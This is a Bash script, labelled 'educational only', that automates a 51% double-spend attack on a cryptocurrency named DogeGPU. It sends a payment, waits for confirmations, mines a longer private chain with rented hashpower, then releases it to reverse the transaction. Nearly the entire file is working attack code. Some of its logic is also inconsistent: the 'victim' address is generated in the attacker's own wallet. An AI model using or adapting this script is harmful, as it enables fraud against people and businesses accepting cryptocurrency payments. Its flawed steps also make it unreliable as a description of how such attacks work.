#!/bin/bash

# DogeGPU 51% Attack Automation Script
# WARNING: Educational purposes only!

set -e

# Configuration
DOGPU_DIR="$HOME/dogpu_attack/Dogpu/DogeGPU-master"
HONEST_DIR="$HOME/dogpu_attack/honest_node"
ATTACK_DIR="$HOME/dogpu_attack/attack_node"
RPC_USER="attack"
RPC_PASS="attack123"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to execute RPC commands
rpc_honest() {
    cd "$DOGPU_DIR"
    ./src/dogpu-cli -datadir="$HONEST_DIR" -rpcuser="$RPC_USER" -rpcpassword="$RPC_PASS" -rpcport=8332 "$@"
}

rpc_attack() {
    cd "$DOGPU_DIR"
    ./src/dogpu-cli -datadir="$ATTACK_DIR" -rpcuser="$RPC_USER" -rpcpassword="$RPC_PASS" -rpcport=8334 "$@"
}

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to wait for balance
wait_for_coins() {
    local target_balance=$1
    print_status "Waiting for balance to reach $target_balance DOGPU..."
    
    while true; do
        local balance=$(rpc_honest getbalance 2>/dev/null || echo "0")
        local balance_int=$(echo "$balance" | cut -d'.' -f1)
        
        if [ "$balance_int" -ge "$target_balance" ]; then
            print_success "Balance reached: $balance DOGPU"
            break
        fi
        
        echo -ne "\rCurrent balance: $balance DOGPU (need $target_balance)"
        sleep 30
    done
}

# Function to monitor confirmations
wait_for_confirmations() {
    local txid=$1
    local target_confirmations=$2
    
    print_status "Waiting for $target_confirmations confirmations of transaction $txid..."
    
    while true; do
        local confirmations=$(rpc_honest gettransaction "$txid" 2>/dev/null | grep -o '"confirmations":[0-9]*' | cut -d':' -f2 || echo "0")
        
        if [ "$confirmations" -ge "$target_confirmations" ]; then
            print_success "Transaction has $confirmations confirmations"
            break
        fi
        
        echo -ne "\rConfirmations: $confirmations/$target_confirmations"
        sleep 15
    done
}

# Main attack function
execute_attack() {
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                    DOGEGPU 51% ATTACK                       ║"
    echo "║                  Educational Use Only!                      ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    # Phase 1: Check setup
    print_status "Phase 1: Checking setup..."
    
    if [ ! -f "$DOGPU_DIR/src/dogpud" ]; then
        print_error "DogeGPU not found. Please build it first."
        exit 1
    fi
    
    # Check if honest node is running
    if ! rpc_honest getblockchaininfo >/dev/null 2>&1; then
        print_error "Honest node not running. Start it first."
        exit 1
    fi
    
    print_success "Setup verified"
    
    # Phase 2: Wait for sufficient coins
    print_status "Phase 2: Acquiring coins through mining..."
    wait_for_coins 1000
    
    # Phase 3: Create attack transaction
    print_status "Phase 3: Creating double-spend transaction..."
    
    local victim_address=$(rpc_honest getnewaddress)
    local attack_amount="500.0"
    local attack_txid=$(rpc_honest sendtoaddress "$victim_address" "$attack_amount")
    
    print_success "Created attack transaction:"
    echo "  Transaction ID: $attack_txid"
    echo "  Amount: $attack_amount DOGPU"
    echo "  Victim address: $victim_address"
    
    # Phase 4: Wait for confirmations
    print_status "Phase 4: Waiting for transaction confirmations..."
    wait_for_confirmations "$attack_txid" 6
    
    # Save current state
    local current_height=$(rpc_honest getblockcount)
    local attack_from_height=$((current_height - 7))
    
    print_status "Current blockchain height: $current_height"
    print_status "Will attack from height: $attack_from_height"
    
    # Phase 5: Setup attack node
    print_status "Phase 5: Setting up private attack chain..."
    
    # Stop attack node if running
    rpc_attack stop 2>/dev/null || true
    sleep 5
    
    # Start isolated attack node
    cd "$DOGPU_DIR"
    ./src/dogpud -datadir="$ATTACK_DIR" \
        -rpcuser="$RPC_USER" -rpcpassword="$RPC_PASS" \
        -rpcport=8334 -port=8335 \
        -server -rpcallowip=0.0.0.0/0 \
        -connect=0 -daemon
    
    sleep 10
    
    print_success "Attack node started"
    
    # Phase 6: Wait for mining redirection
    print_warning "MANUAL STEP REQUIRED:"
    echo "1. Go to MiningRigRentals dashboard"
    echo "2. Change pool from: stratum+tcp://YOUR_IP:8332"
    echo "3. To: stratum+tcp://YOUR_IP:8334"
    echo "4. Worker: attack_miner"
    echo ""
    read -p "Press Enter when you've redirected your mining rig..."
    
    # Phase 7: Monitor attack progress
    print_status "Phase 7: Mining private chain..."
    
    local start_time=$(date +%s)
    while true; do
        local honest_height=$(rpc_honest getblockcount 2>/dev/null || echo "0")
        local attack_height=$(rpc_attack getblockcount 2>/dev/null || echo "0")
        local elapsed=$(($(date +%s) - start_time))
        
        echo -ne "\rHonest: $honest_height | Attack: $attack_height | Time: ${elapsed}s"
        
        if [ "$attack_height" -gt "$honest_height" ]; then
            echo ""
            print_success "Attack chain is longer! Ready to release attack."
            break
        fi
        
        sleep 15
    done
    
    # Phase 8: Release the attack
    print_status "Phase 8: Releasing 51% attack..."
    
    print_warning "This will cause a blockchain reorganization!"
    read -p "Press Enter to execute the attack..."
    
    # Connect attack node to honest network
    rpc_attack addnode "127.0.0.1:8333" add
    
    print_status "Attack released! Waiting for reorganization..."
    sleep 60
    
    # Phase 9: Verify attack success
    print_status "Phase 9: Verifying attack results..."
    
    local attack_result=$(rpc_honest gettransaction "$attack_txid" 2>&1 || echo "INVALID")
    
    if [[ $attack_result == *"Invalid"* ]] || [[ $attack_result == *"not found"* ]]; then
        echo ""
        print_success "🎯 ATTACK SUCCESSFUL!"
        echo "  ✅ Transaction $attack_txid was reversed"
        echo "  ✅ You still have the $attack_amount DOGPU"
        echo "  ✅ Victim lost their $attack_amount DOGPU"
        echo ""
        echo -e "${GREEN}Double-spend attack completed successfully!${NC}"
    else
        echo ""
        print_error "❌ Attack failed"
        echo "  Transaction still exists in blockchain"
        echo "  Attack chain may not have been longer"
    fi
    
    # Show final balances
    local final_balance=$(rpc_honest getbalance)
    echo ""
    echo "Final balance: $final_balance DOGPU"
    
    # Cleanup
    print_status "Cleaning up..."
    rpc_attack stop 2>/dev/null || true
    
    echo ""
    print_warning "Remember to redirect your mining rig back to honest mining!"
    echo "Change pool back to: stratum+tcp://YOUR_IP:8332"
}

# Check if script is run with correct permissions
if [ "$EUID" -eq 0 ]; then
    print_error "Don't run this script as root!"
    exit 1
fi

# Run the attack
execute_attack